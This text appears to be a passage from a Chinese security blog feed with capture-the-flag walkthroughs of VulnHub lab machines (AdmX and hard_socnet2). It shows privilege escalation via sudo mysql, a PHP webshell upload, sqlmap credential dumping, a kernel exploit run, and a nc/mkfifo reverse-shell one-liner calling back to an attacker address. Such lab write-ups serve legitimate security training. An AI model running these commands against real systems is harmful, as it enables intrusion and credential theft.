plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure><p>å°è¯•è¾“å…¥å¯†ç adam14</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117154929085.png" alt="image-20211117154929085"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155043263.png" alt="image-20211117155043263"></p><p>flag1:153495edec1b606c24947b1335998bd9</p><h3 id="9-äºŒæ¬¡ææƒ"><a href="#9-äºŒæ¬¡ææƒ" class="headerlink" title="9.äºŒæ¬¡ææƒ"></a>9.äºŒæ¬¡ææƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>æç¤ºå¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ï¼š</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155135536.png" alt="image-20211117155135536"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p    #è¾“å…¥å¯†ç adam14</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155339940.png" alt="image-20211117155339940"></p><p>æˆåŠŸç™»å½•æ•°æ®åº“</p><h3 id="10-åˆ©ç”¨mysqlæ•°æ®åº“ç‰¹æ€§"><a href="#10-åˆ©ç”¨mysqlæ•°æ®åº“ç‰¹æ€§" class="headerlink" title="10.åˆ©ç”¨mysqlæ•°æ®åº“ç‰¹æ€§"></a>10.åˆ©ç”¨mysqlæ•°æ®åº“ç‰¹æ€§</h3><p>å½“å‰å¯åŠ¨çš„æ•°æ®åº“è¿›ç¨‹æ˜¯å…·æœ‰rootæƒé™çš„ï¼Œç»“åˆmysqlæ•°æ®åº“ system å‘½ä»¤ çš„åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155440756.png" alt="image-20211117155440756"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155507429.png" alt="image-20211117155507429"></p><p>æˆåŠŸè·å–rootæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117155542610.png" alt="image-20211117155542610"></p><p>flag2:7efd721c8bfff2937c66235f2d0dbac1</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;é¶æœºåœ°å€: &lt;a href=&quot;https://download.vulnhub.com/admx/AdmX_new.7z&quot;&gt;https://download.vulnhub.com/admx/AdmX_new.7z&lt;/a&gt;&lt;br&gt;éš¾åº¦ç­‰çº§: ä¸­&lt;br&gt;æ‰“é¶ç›®æ ‡: å–å¾— 2 ä¸ª flag + root æƒé™&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-5-hard_socnet2</title>
    <link href="http://example.com/2022/04/12/week5/"/>
    <id>http://example.com/2022/04/12/week5/</id>
    <published>2022-04-12T07:08:48.838Z</published>
    <updated>2022-04-12T07:11:05.643Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>é¶æœºåœ°å€:</strong> <a href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova">https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</a></p><p><strong>éš¾åº¦ç­‰çº§: é«˜</strong></p><p><strong>æ‰“é¶ç›®æ ‡:</strong> å–å¾— root æƒé™</p><p><strong>å‚è€ƒé“¾æ¥:</strong> </p><ol><li><a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">https://docs.python.org/zh-cn/3/library/xmlrpc.html</a></li></ol></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-æ¢æµ‹ä¸»æœºå­˜æ´»"><a href="#1-æ¢æµ‹ä¸»æœºå­˜æ´»" class="headerlink" title="1.æ¢æµ‹ä¸»æœºå­˜æ´»"></a>1.æ¢æµ‹ä¸»æœºå­˜æ´»</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 10.0.2.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175256383.png" alt="image-20211117175256383"></p><h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.12</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175552751.png" alt="image-20211117175552751"></p><p>ç»“æœæ˜¾ç¤ºç›®æ ‡å¼€æ”¾äº†22,80,8000ç«¯å£</p><h3 id="3-ç«¯å£æœåŠ¡æ‰«æ"><a href="#3-ç«¯å£æœåŠ¡æ‰«æ" class="headerlink" title="3.ç«¯å£æœåŠ¡æ‰«æ"></a>3.ç«¯å£æœåŠ¡æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p22,80,8000 10.0.2.12</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175710597.png" alt="image-20211117175710597"></p><p>22ç«¯å£ SSH</p><p>80ç«¯å£ Apache2.4.29 Ubuntu(æ“ä½œç³»ç»Ÿ)</p><p>8000ç«¯å£ BaseHTTPServer Python2.7.15(ç›®æ ‡é¶æœºæ”¯æŒPythonç¯å¢ƒ)</p><h3 id="4-è®¿é—®8000ç«¯å£"><a href="#4-è®¿é—®8000ç«¯å£" class="headerlink" title="4.è®¿é—®8000ç«¯å£"></a>4.è®¿é—®8000ç«¯å£</h3><h4 id="4-1é¡µé¢æŠ¥é”™"><a href="#4-1é¡µé¢æŠ¥é”™" class="headerlink" title="4.1é¡µé¢æŠ¥é”™"></a>4.1é¡µé¢æŠ¥é”™</h4><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175907396.png" alt="image-20211117175907396"></p><p>é¡µé¢ä¿¡æ¯æŠ¥é”™ï¼šæœåŠ¡å™¨<strong>ä¸æ”¯æŒGETæ–¹æ³•</strong></p><h4 id="4-2å°è¯•æ›´æ”¹è¯·æ±‚æ–¹æ³•"><a href="#4-2å°è¯•æ›´æ”¹è¯·æ±‚æ–¹æ³•" class="headerlink" title="4.2å°è¯•æ›´æ”¹è¯·æ±‚æ–¹æ³•"></a>4.2å°è¯•æ›´æ”¹è¯·æ±‚æ–¹æ³•</h4><p>æŠ“åŒ…å‘é€åˆ°Repeater</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091243343.png" alt="image-20211118091243343"></p><p>åˆ†åˆ«æ›´æ”¹ä¸ºå…¶ä»–å„ç§HTTPè¯·æ±‚æ–¹æ³•ï¼Œåˆ†åˆ«æäº¤</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091738052.png" alt="image-20211118091738052"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091813470.png" alt="image-20211118091813470"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118091930161.png" alt="image-20211118091930161"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118092037650.png" alt="image-20211118092037650"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118092119731.png" alt="image-20211118092119731"></p><p>åœ¨å°è¯•è¯¸å¤šä¸åŒçš„è¯·æ±‚æ–¹æ³•åï¼Œè¿”å›çš„ç»“æœä¹Ÿæ˜¯<strong>æŠ¥é”™å¤±è´¥</strong></p><h3 id="5-è®¿é—®80ç«¯å£"><a href="#5-è®¿é—®80ç«¯å£" class="headerlink" title="5.è®¿é—®80ç«¯å£"></a>5.è®¿é—®80ç«¯å£</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117175818445.png" alt="image-20211117175818445"></p><h4 id="5-1æµ‹è¯•ç™»å½•åŠŸèƒ½"><a href="#5-1æµ‹è¯•ç™»å½•åŠŸèƒ½" class="headerlink" title="5.1æµ‹è¯•ç™»å½•åŠŸèƒ½"></a>5.1æµ‹è¯•ç™»å½•åŠŸèƒ½</h4><p>å°è¯•è¿›è¡Œç™»å½•</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211117180300696.png" alt="image-20211117180300696"></p><p>å‘ç°ç™»é™†é¡µé¢éœ€è¦é‚®ç®±å’Œå¯†ç ï¼Œä¸”<strong>å­˜åœ¨é‚®ç®±æ ¼å¼çš„æ ¡éªŒ</strong></p><h4 id="5-2æµ‹è¯•æ³¨å†ŒåŠŸèƒ½"><a href="#5-2æµ‹è¯•æ³¨å†ŒåŠŸèƒ½" class="headerlink" title="5.2æµ‹è¯•æ³¨å†ŒåŠŸèƒ½"></a>5.2æµ‹è¯•æ³¨å†ŒåŠŸèƒ½</h4><p>ç®€å•çš„æ³¨å†Œä¸€ä¸ªè´¦å·</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102057359.png" alt="image-20211118102057359"></p><p>æ³¨å†Œå®Œæ¯•åè‡ªåŠ¨è·³è½¬åˆ° è¯¥ç”¨æˆ·ç™»å½•åçš„é¡µé¢</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102610231.png" alt="image-20211118102610231"></p><p>å¯¹é¡µé¢ä¸­çš„ä¿¡æ¯è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°åä¸ºadminçš„ç”¨æˆ·ç•™è¨€æ˜¾ç¤ºåå°è¿è¡Œç›‘è§†æœåŠ¡å™¨çš„<strong>pythonè„šæœ¬</strong>ï¼Œåä¸º<strong>monitor.py</strong>ï¼Œåœ¨æ­¤ä¹Ÿéš¾å…æƒ³èµ·ä¹‹å‰å¯¹ç«¯å£æœåŠ¡æ‰«æçš„æ—¶å€™ï¼Œ8000ç«¯å£çš„åä¸ºBaseHTTPServerçš„æœåŠ¡å’Œpythonç¯å¢ƒï¼Œä¹‹åå­˜åœ¨å¯åˆ©ç”¨çš„å¯èƒ½æ€§</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102735643.png" alt="image-20211118102735643"></p><p>ç»§ç»­å¯¹ç½‘ç«™é¡µé¢å†…çš„å…¶ä»–æ¿å—åŠŸèƒ½è¿›è¡Œæµ‹è¯•ï¼Œåœ¨Profileé¡µé¢å†…æ˜¾ç¤ºå½“å‰ç”¨æˆ·æœªæäº¤â€“è¿™é‡ŒæŒ‡çš„åº”è¯¥æ˜¯ç•™è¨€&#x2F;å‘å¸–</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103438523.png" alt="image-20211118103438523"></p><p>ç®€å•æäº¤ä¸€äº›ä¿¡æ¯</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103739734.png" alt="image-20211118103739734"></p><p>å‘ç°Profileé¡µé¢å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä¸”å‘ç°ä¸Šä¼ å¤´åƒåŒºï¼Œé‚£æ˜¯å¦ä¹Ÿå¯å°è¯•<strong>æ–‡ä»¶ä¸Šä¼ </strong>æœ¨é©¬å‘¢ï¼Ÿ</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118103916272.png" alt="image-20211118103916272"></p><h4 id="5-3æµ‹è¯•é¡µé¢"><a href="#5-3æµ‹è¯•é¡µé¢" class="headerlink" title="5.3æµ‹è¯•é¡µé¢"></a>5.3æµ‹è¯•é¡µé¢</h4><h5 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h5><p>æ–°å»ºaa.phpæ–‡ä»¶ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¸Šä¼ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi aa.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118104652005.png" alt="image-20211118104652005"></p><p>æ²¡æœ‰å¯¹æ–‡ä»¶çš„åç¼€å’Œå†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œæ­¤æ—¶å¤´åƒè™½æœªæ˜¾ç¤ºï¼Œä½†å·²ç»è¢«æ›¿æ¢ä¸ºåˆšæ‰ä¸Šä¼ çš„phpæ–‡ä»¶</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118104836716.png" alt="image-20211118104836716"></p><p>å¤åˆ¶å¤´åƒçš„åœ°å€</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118105035254.png" alt="image-20211118105035254"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118105408035.png" alt="image-20211118105408035"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118145211734.png" alt="image-20211118145211734"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118145647280.png" alt="image-20211118145647280"></p><p>æˆåŠŸæ‹¿åˆ°ç›®æ ‡é¶æœºçš„åŸºæœ¬æƒé™</p><h5 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h5><p>å†æ¬¡å›åˆ°é¡µé¢ï¼Œå°è¯•å¯¹å…¶ä»–åŠŸèƒ½è¿›è¡Œæµ‹è¯•ã€‚</p><p>æœ€ç»ˆå‘ç°åœ¨æœç´¢æ å†…æäº¤äº†å•å¼•å·å</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118150028569.png" alt="image-20211118150028569"></p><p>é¡µé¢æ˜¾ç¤ºåå°æ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯ï¼Œç›®æ ‡æ•°æ®åº“åº”æ˜¯MySQLæ•°æ®åº“ï¼Œä½¿ç”¨SQLMAPè¿›è¡Œæµ‹è¯•</p><p>â€‹ä½¿ç”¨BurpæŠ“å–æäº¤è¿‡ç¨‹ä¸­çš„æ•°æ®å¹¶å°†å…¶å¤åˆ¶è‡³testæ–‡ä»¶</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118150619413.png" alt="image-20211118150619413"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query     #-p æŒ‡å®šå‚æ•°</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151256012.png" alt="image-20211118151256012"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151238752.png" alt="image-20211118151238752"></p><p>ç¡®å®šå­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œä¿¡æ¯çš„è·å–äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query --dbs</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151606121.png" alt="image-20211118151606121"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork --tables</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151752362.png" alt="image-20211118151752362"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork -T users --columns</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118151941038.png" alt="image-20211118151941038"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152315735.png" alt="image-20211118152315735"></p><p>è·å¾—äº†adminè´¦å·çš„é‚®ç®±åœ°å€å’Œå¯†ç ï¼Œä½¿ç”¨adminç™»å½•</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152420558.png" alt="image-20211118152420558"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118152513424.png" alt="image-20211118152513424"></p><p>ä½†æ˜¯åœ¨adminè´¦å·å†…ä¹Ÿæœªå‘ç°å¯åˆ©ç”¨çš„ä¿¡æ¯ã€‚</p><h3 id="ï¼ˆæ—¶é—´yydsğŸ˜„ï¼‰"><a href="#ï¼ˆæ—¶é—´yydsğŸ˜„ï¼‰" class="headerlink" title="ï¼ˆæ—¶é—´yydsğŸ˜„ï¼‰"></a>ï¼ˆæ—¶é—´yydsğŸ˜„ï¼‰</h3><h4 id="CVE-2021-3493æœ¬åœ°ææƒ"><a href="#CVE-2021-3493æœ¬åœ°ææƒ" class="headerlink" title="CVE-2021-3493æœ¬åœ°ææƒ"></a>CVE-2021-3493æœ¬åœ°ææƒ</h4><p>å†æ¬¡å›åˆ°èšå‰‘shellä¸­</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118153207728.png" alt="image-20211118153207728"></p><p>ç›®æ ‡å†…æ ¸4.15.0-38 æ“ä½œç³»ç»ŸUbuntuç‰ˆæœ¬ä¸º18.04.1 ç°åœ¨è¾ƒæ–°çš„ç‰ˆæœ¬18.04.5</p><p>æŸ¥è¯¢å‘ç°äº†è¾ƒæ–°çš„é€šç”¨å…¬å…±æ¼æ´â€“</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118154013454.png" alt="image-20211118154013454"></p><p>æ€è·¯ï¼šä¸Šä¼ è‡³ç›®æ ‡é¶æœºä¸Šï¼Œä½¿ç”¨gccç¼–è¯‘åï¼Œæœ¬åœ°æ‰§è¡Œ</p><p>ä½¿ç”¨èšå‰‘æ–‡ä»¶ç®¡ç†ä¸Šä¼ åˆ°ç›®æ ‡é¶æœºä¸Š</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118155210947.png" alt="image-20211118155210947"></p><p>ä½¿ç”¨gccç¼–è¯‘åæ‰å¯æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp exploit.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118155624865.png" alt="image-20211118155624865"></p><p>ä¼¼ä¹åœ¨èšå‰‘çš„shellå†…ä¸èƒ½æ­£å¸¸è¿è¡Œï¼Œå°è¯•ä½¿ç”¨ncçš„shell</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118160045951.png" alt="image-20211118160045951"></p><p>ä¸æ”¯æŒ-eå‚æ•°ï¼ˆå¯ä½¿ç”¨ä¸²è”æ–¹æ³•ï¼‰ï¼Œè¿™é‡Œä¸ºäº†æ‹“å±•æ”»å‡»æ–¹æ³•çš„å¤šæ ·æ€§ï¼Œä½¿ç”¨å‘½ä»¤</p><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122111610268.png" alt="image-20211122111610268"></p><p>èšå‰‘shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><blockquote><p>rm &#x2F;tmp&#x2F;f åˆ é™¤è¯¥æ–‡ä»¶ï¼ˆä»¥å…è·Ÿåé¢å®šä¹‰çš„ ç®¡é“ç¬¦ å†²çªï¼‰</p><p>mkfifo &#x2F;tmp&#x2F;f è¿™æ˜¯åˆ›å»ºè‡ªå®šä¹‰æœ‰åç®¡é“ç¬¦ã€‚ç®¡é“ç¬¦çš„åç§°æ˜¯ &#x2F;tmp&#x2F;f ï¼ˆç”¨äºè¿›ç¨‹é—´çš„é€šè®¯ï¼Œ å¦‚ ls &gt; &#x2F;tmp&#x2F;f ï¼Œcat &#x2F;tmp&#x2F;f ,è¿é€šä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„é€šè®¯)</p><p>cat &#x2F;tmp&#x2F;f å–å‡ºç®¡é“ç¬¦ä¸­çš„å†…å®¹</p><p>|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1 å°†å‰é¢å–å‡ºçš„å†…å®¹ä½œä¸ºè¾“å…¥ï¼Œè¾“å…¥ç»™ &#x2F;bin&#x2F;shï¼Œå†å°†bashçš„æ ‡å‡†é”™è¯¯è¾“å‡º ä¹Ÿä½œä¸ºæ ‡å‡†è¾“å…¥ ï¼ˆ2 &gt;&amp;1ï¼‰ç»™bash ç„¶åå†å°†bashçš„è¾“å‡ºï¼Œä¼ ç»™nc è¿œç¨‹ï¼Œå†å°†nc ä¼ æ¥çš„æ•°æ®ï¼Œå†™å…¥ ç®¡é“ç¬¦ &#x2F;tmp&#x2F;f ã€‚æœ€åé¦–å°¾æ¥é€šäº†ã€‚</p></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112048252.png" alt="image-20211122112048252"></p><p>æ‰§è¡ŒåæˆåŠŸä¸Šçº¿</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112120594.png" alt="image-20211122112120594"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122112256382.png" alt="image-20211122112256382"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122113004129.png" alt="image-20211122113004129"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122113224509.png" alt="image-20211122113224509"></p><p>æˆåŠŸææƒåˆ°rootæƒé™</p><p>åˆ©ç”¨å†…æ ¸æ¼æ´ææƒåï¼Œå°è¯•å…¶ä»–æ–¹æ³•</p><p>åŠŸæˆèº«é€€ğŸ¤¦â€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114416703.png" alt="image-20211122114416703"></p><p>å›åˆ°æ™®é€šæƒé™å æœé›†å½“å‰æƒé™ä¸‹æœ‰æ— å¯ç”¨ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114629491.png" alt="image-20211122114629491"></p><p>å‘ç°ç”¨æˆ·socnetå…·æœ‰bash æƒé™ï¼ŒçŒœæµ‹å…¶å¯èƒ½ä¸ºä¸»è¦ç®¡ç†è´¦å·</p><p>å°è¯•æŸ¥çœ‹&#x2F;homeç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨è¯¥ç”¨æˆ·æ–‡ä»¶å¤¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd socnet</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211122114956833.png" alt="image-20211122114956833"></p><p>å‘ç°äº†åä¸º<strong>monitor.py</strong>çš„è„šæœ¬ï¼Œéš¾å…ä¼šæƒ³åˆ°ä¹‹å‰åœ¨ç½‘ç«™é¡µé¢å†…adminç”¨æˆ·çš„ç•™è¨€æè¿°ä¸ºåå°è¿è¡Œçš„ç”¨æ¥ç›‘è§†æœåŠ¡å™¨çš„<strong>pythonè„šæœ¬</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211118102735643.png" alt="image-20211118102735643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep monitor</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4-1//image-20211124093318091.png" alt="image-20211124093318091"></p><p>æŸ¥çœ‹è¿›ç¨‹å‘ç°monitor.pyåœ¨è¿è¡Œ é‚£ä¹ˆä¸å¦¨æŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat monitor.py</span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸€ä¸‹ï¼š</p><blockquote><p>#my remote server management API #å¤‡æ³¨ä¸ºè¿œç¨‹ç®¡ç†çš„API<br>import SimpleXMLRPCServer #å¯¼å…¥äº†XMLRPCçš„åº“<br>import subprocess #åˆ›å»ºè¿›ç¨‹<br>import random #ç”Ÿæˆéšæœºæ•°</p><p>debugging_pass &#x3D; random.randint(1000,9999) #ç”Ÿæˆ1000-9999åŒºé—´çš„éšæœºæ•°</p><p>def runcmd(cmd):          #å®šä¹‰å‡½æ•°runcmdå’Œå˜é‡cmd<br>    results &#x3D; subprocess.Popen(cmd, shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE)  </p><p>#åˆ›å»ºæ–°çš„è¿›ç¨‹ æ‰§è¡Œå˜é‡cmd å¯ç”¨ä¸€ä¸ªæ–°çš„shellæ‰§è¡Œå‘½ä»¤ å¹¶å°†shellçš„è¾“å‡ºå’ŒæŠ¥é”™ä¿¡æ¯éƒ½å®šä¹‰ä¸ºæ–°çš„å˜é‡<br>    output &#x3D; results.stdout.read() + results.stderr.read()<br>    return output</p><p>#ä½¿ç”¨outputå˜é‡ç»Ÿä¸€å°†ç»“æœè¾“å‡ºåˆ°é¡µé¢</p><p>def cpu():<br>    return runcmd(â€œcat &#x2F;proc&#x2F;cpuinfoâ€)</p><p>#å®šä¹‰å˜é‡cpu è°ƒç”¨runcmdå‡½æ•°æ‰§è¡Œcat &#x2F;proc&#x2F;cpuinfoæŸ¥çœ‹cpuç›¸å…³ä¿¡æ¯</p><p>def mem():<br>    return runcmd(â€œfree 